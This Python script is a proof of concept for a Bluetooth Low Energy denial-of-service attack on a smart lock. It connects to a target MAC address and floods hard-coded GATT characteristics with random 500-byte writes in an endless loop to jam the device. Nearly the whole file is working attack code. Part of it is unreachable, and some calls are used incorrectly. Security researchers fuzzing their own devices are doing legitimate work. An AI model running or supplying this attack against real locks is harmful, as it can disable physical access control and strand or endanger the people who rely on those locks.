import asyncio, os, argparse, bleak
from bleak import BleakClient


# MY DEVICE
MAC = "CC:38:35:30:6F:83"

class POC():
    """POC for DOS attack on BLE Lock"""


    
    @staticmethod
    async def _fuzz(mac: str):
        """This is responsible for fuzzing"""


        # STATIC UUIDS of my DEVICE --> MAC // THESE CHARS HAVE WRITE REQUEST <-- FUZZING / /CHANEGE UUIDS (property=write), if different
        characteristics = ["00000001-0000-1001-8001-00805f9b07d0", "00002a01-0000-1000-8000-00805f9b34fb"]
        loops = 10


        while loops > 0:

            try:

                print("[*] Attempting Connection...")

                async with BleakClient(mac) as client:

                    t = False


                    client.connect()
                    #client.mtu_size = 700
                    #bleak.backends.characteristic.BleakGATTCharacteristic.max_write_without_response_size = 300
                    if client.is_connected:

                        print(f"\n\n[+] Successfully connected to: {mac}")
                        print("[+] Launching connection JAM!\n")#; await client.pair(), client.unpair(), client.disconnect()

                        services = list(client.services); chars = []


                        shit = ['00000001-0000-1001-8001-00805f9b07d0', '00000002-0000-1001-8001-00805f9b07d0', '00002a01-0000-1000-8000-00805f9b34fb', '00002a00-0000-1000-8000-00805f9b34fb', '00002a04-0000-1000-8000-00805f9b34fb', '00002ac9-0000-1000-8000-00805f9b34fb', '00002a05-0000-1000-8000-00805f9b34fb']

                        while True:
                            for shii in shit:
                                payload = os.urandom(500)
                                await client.write_gatt_char(char_specifier=shii, data=payload, response=False)
                                print(f"Fuzz: {payload.hex()} --> {shii}")                                



                        if not t: return

                        for service in services:

                            char = service.uuid

                            print(f"[+] Found Service: {service}")
  
                            characteristics = service.characteristics

                            for char in characteristics:

                                uuid = char.uuid; property = char.properties
                                space = " " * 8

                                print(f"[+]{space}Char: {property} --> {uuid}")

                                filler = "write"
                                
                                if uuid not in chars: chars.append(uuid); loops -= 1


                        print(chars)
                        while True:
                            for char in chars:
                                payload = os.urandom(5)
                                #await client.pair()
                                await client.write_gatt_char(char_specifier=char, data=payload, response=True)
                                
                                print(f"[+] Fuzz: {payload.hex} --> {mac}")

                
            except Exception as e:
                print(f"Exception Error: {e}")
                pass
        

        print("All loops done")


    @staticmethod
    def main():
        """Start class action"""

        parser = argparse.ArgumentParser(description="Input ble lock mac to fuzz")
        parser.add_argument("-m", required=True, help="Input mac address")


        args = parser.parse_args()
        mac = args.m 


        if mac: asyncio.run(POC._fuzz(mac=mac))
        else: print("[!] Input mac silly") # <-- FOR SHOW




if __name__ == "__main__":
    POC.main()